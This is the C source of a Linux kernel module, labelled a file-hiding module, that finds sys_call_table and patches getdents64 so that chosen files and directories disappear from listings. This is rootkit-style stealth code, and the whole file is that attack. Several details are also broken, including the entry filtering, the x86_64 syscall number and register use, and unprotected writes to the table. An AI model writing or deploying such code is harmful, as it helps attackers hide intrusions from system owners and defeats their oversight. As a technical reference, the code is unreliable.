/*
 * hook_manager.c - Hook core manager
 * File hiding module for ARM64
 * Uses syscall table hook instead of kprobe
 */

#include <linux/module.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/unistd.h>
#include <linux/uaccess.h>

#include "hook.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("HOOK");
MODULE_DESCRIPTION("File Hiding Module");
MODULE_VERSION("1.0");

/* Hidden file/folder storage */
static struct hidden_entry hidden_files[MAX_HIDDEN_FILES];
static int hidden_count = 0;
static DEFINE_SPINLOCK(hidden_lock);

/* Syscall hook support */
#ifdef CONFIG_ARM64
#include <asm/syscall.h>
#include <asm/thread_info.h>

/* syscall number for getdents64 */
#define __NR_getdents64 61

typedef asmlinkage long (*syscall_fn_t)(const struct pt_regs *regs);
static syscall_fn_t orig_getdents64;

static void __user *get_dirent_ptr(const struct pt_regs *regs)
{
    return (void __user *)regs->regs[1];
}

static int get_dirent_count(const struct pt_regs *regs)
{
    return (int)regs->regs[2];
}
#else
/* x86_64 support */
#include <asm/processor.h>

#define __NR_getdents64 61

typedef asmlinkage long (*syscall_fn_t)(const struct pt_regs *regs);
static syscall_fn_t orig_getdents64;

static void __user *get_dirent_ptr(const struct pt_regs *regs)
{
    return (void __user *)regs->di;
}

static int get_dirent_count(const struct pt_regs *regs)
{
    return (int)regs->si;
}
#endif

int add_hidden_file(const char *name, bool is_dir)
{
    unsigned long flags;
    int i;

    if (!name || strlen(name) >= sizeof(hidden_files[0].name))
        return -EINVAL;

    spin_lock_irqsave(&hidden_lock, flags);

    for (i = 0; i < hidden_count; i++) {
        if (hidden_files[i].active &&
            strcmp(hidden_files[i].name, name) == 0 &&
            hidden_files[i].is_dir == is_dir) {
            spin_unlock_irqrestore(&hidden_lock, flags);
            return -EEXIST;
        }
    }

    if (hidden_count >= MAX_HIDDEN_FILES) {
        spin_unlock_irqrestore(&hidden_lock, flags);
        return -ENOSPC;
    }

    strcpy(hidden_files[hidden_count].name, name);
    hidden_files[hidden_count].is_dir = is_dir;
    hidden_files[hidden_count].active = true;
    hidden_count++;

    spin_unlock_irqrestore(&hidden_lock, flags);
    pr_info("hook: added hidden %s: %s\n", is_dir ? "dir" : "file", name);
    return 0;
}

int remove_hidden_file(const char *name)
{
    unsigned long flags;
    int i;

    spin_lock_irqsave(&hidden_lock, flags);

    for (i = 0; i < hidden_count; i++) {
        if (hidden_files[i].active &&
            strcmp(hidden_files[i].name, name) == 0) {
            hidden_files[i].active = false;
            spin_unlock_irqrestore(&hidden_lock, flags);
            pr_info("hook: removed hidden: %s\n", name);
            return 0;
        }
    }

    spin_unlock_irqrestore(&hidden_lock, flags);
    return -ENOENT;
}

bool is_hidden(const char *name, bool is_dir)
{
    unsigned long flags;
    bool found = false;
    int i;

    if (!name)
        return false;

    spin_lock_irqsave(&hidden_lock, flags);

    for (i = 0; i < hidden_count; i++) {
        if (hidden_files[i].active &&
            hidden_files[i].is_dir == is_dir &&
            strcmp(hidden_files[i].name, name) == 0) {
            found = true;
            break;
        }
    }

    spin_unlock_irqrestore(&hidden_lock, flags);
    return found;
}

void clear_hidden_list(void)
{
    unsigned long flags;
    int i;

    spin_lock_irqsave(&hidden_lock, flags);

    for (i = 0; i < hidden_count; i++)
        hidden_files[i].active = false;
    hidden_count = 0;

    spin_unlock_irqrestore(&hidden_lock, flags);
    pr_info("hook: hidden list cleared\n");
}

/* Directory entry structures */
struct linux_dirent64 {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[256];
};

/* Hooked getdents64 syscall */
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    long ret;
    struct linux_dirent64 __user *dirent;
    struct linux_dirent64 *kbuf = NULL;
    struct linux_dirent64 *curr, *prev;
    int count;
    int new_count;
    char name[256];

    /* Call original syscall first */
    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    dirent = get_dirent_ptr(regs);
    count = (int)ret;

    /* Allocate kernel buffer */
    kbuf = kmalloc(count + 256, GFP_KERNEL);
    if (!kbuf)
        return ret;

    /* Copy from user space */
    if (copy_from_user(kbuf, dirent, count)) {
        kfree(kbuf);
        return ret;
    }

    /* Filter directory entries */
    curr = kbuf;
    prev = NULL;
    new_count = count;

    while (curr < kbuf + count) {
        unsigned short reclen = curr->d_reclen;

        if (reclen == 0)
            break;

        /* Get entry name */
        memset(name, 0, sizeof(name));
        strncpy(name, curr->d_name, sizeof(name) - 1);

        /* Check if should be hidden */
        if (is_hidden(name, curr->d_type == DT_DIR)) {
            /* Remove this entry */
            new_count -= reclen;
            if (prev) {
                /* Adjust previous entry's d_off */
                prev->d_off = curr->d_off;
            }
        } else {
            prev = curr;
        }

        curr = (struct linux_dirent64 *)((char *)curr + reclen);
    }

    /* Copy filtered results back if needed */
    if (new_count < count && new_count > 0) {
        if (copy_to_user(dirent, kbuf, new_count)) {
            /* If copy fails, return original */
            new_count = count;
        }
    }

    kfree(kbuf);
    return new_count;
}

/* External vfs hook functions */
extern int vfs_hook_init(void);
extern void vfs_hook_exit(void);

/* Syscall table handling */
#ifdef CONFIG_ARM64
#include <asm/cacheflush.h>

extern void *kallsyms_lookup_name(const char *name);

static void **get_syscall_table(void)
{
    void **table;

    /* Try to find sys_call_table via kallsyms */
    table = (void **)kallsyms_lookup_name("sys_call_table");
    if (!table) {
        pr_err("hook: failed to find sys_call_table\n");
        return NULL;
    }

    pr_info("hook: sys_call_table found at %px\n", table);
    return table;
}

static int patch_syscall(void **table, int nr, void *new_fn, void **old_fn)
{
    extern void __flush_icache_range(unsigned long, unsigned long);

    if (!table || nr < 0)
        return -EINVAL;

    /* Save original */
    if (old_fn)
        *old_fn = table[nr];

    /* Clear icache and patch */
    flush_cache_vmap((unsigned long)&table[nr],
                     (unsigned long)&table[nr] + sizeof(void *));

    table[nr] = new_fn;

    flush_cache_vmap((unsigned long)&table[nr],
                     (unsigned long)&table[nr] + sizeof(void *));
    dsb(ish);
    isb();

    pr_info("hook: patched syscall %d\n", nr);
    return 0;
}
#else
/* x86_64 fallback */
#include <asm/cacheflush.h>

extern void *kallsyms_lookup_name(const char *name);

static void **get_syscall_table(void)
{
    void **table = (void **)kallsyms_lookup_name("sys_call_table");
    if (!table) {
        pr_err("hook: failed to find sys_call_table\n");
        return NULL;
    }
    pr_info("hook: sys_call_table found at %px\n", table);
    return table;
}

static int patch_syscall(void **table, int nr, void *new_fn, void **old_fn)
{
    if (!table || nr < 0)
        return -EINVAL;

    if (old_fn)
        *old_fn = table[nr];

    table[nr] = new_fn;
    pr_info("hook: patched syscall %d\n", nr);
    return 0;
}
#endif

static void **syscall_table;
static bool syscall_hooked;

static int __init hook_init(void)
{
    int ret;

    /* Get syscall table */
    syscall_table = get_syscall_table();
    if (!syscall_table) {
        pr_err("hook: failed to get syscall table\n");
        return -ENOENT;
    }

    /* Patch getdents64 syscall */
    ret = patch_syscall(syscall_table, __NR_getdents64, hook_getdents64, (void **)&orig_getdents64);
    if (ret < 0) {
        pr_err("hook: failed to patch getdents64: %d\n", ret);
        return ret;
    }

    syscall_hooked = true;

    ret = vfs_hook_init();
    if (ret < 0) {
        pr_err("hook: failed to init vfs hook: %d\n", ret);
        /* Don't return error, syscall hook is already done */
    }

    pr_info("hook: module initialized\n");
    return 0;
}

static void __exit hook_exit(void)
{
    if (syscall_hooked && syscall_table) {
        /* Restore original syscall */
        patch_syscall(syscall_table, __NR_getdents64, orig_getdents64, NULL);
        pr_info("hook: syscall restored\n");
    }

    vfs_hook_exit();
    clear_hidden_list();
    pr_info("hook: module exited\n");
}

module_init(hook_init);
module_exit(hook_exit);
